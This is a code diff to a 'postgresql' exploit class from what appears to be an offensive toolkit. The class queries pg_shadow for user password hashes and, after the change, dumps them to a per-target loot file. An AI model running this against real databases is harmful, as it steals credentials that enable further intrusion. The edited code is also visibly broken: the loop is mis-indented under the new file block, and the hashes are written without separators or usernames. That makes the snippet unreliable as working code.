@@ -45,13 +45,9 @@ class postgresql(Exploit):
             # tries to possibly get md5 hashes if in case it is a superuser
             try:
                 cur.execute("select usename, passwd from pg_shadow")
+                with open(f"../data/{ip_address}_postgresql_md5.txt", "w") as text_file:
                 for l in cur.fetchall():
-                    # adds if the username is not already in there
-
-                    if loot_dict.get(l[0]) == None:
-                        loot_dict[l[0]] = l[1]
-                    else:
-                        loot_dict[l[0]] = l[1]
+                    text_file.write(l[1])
                 print('Success. Gathering all md5 hashes.')
                         
             except psycopg2.ProgrammingError:
@@ -59,6 +55,6 @@ class postgresql(Exploit):
                 pass
 
         for k, v in loot_dict.items():
-            more_loot.append((k, v))
+            more_loot.append((k,))
 
         return more_loot
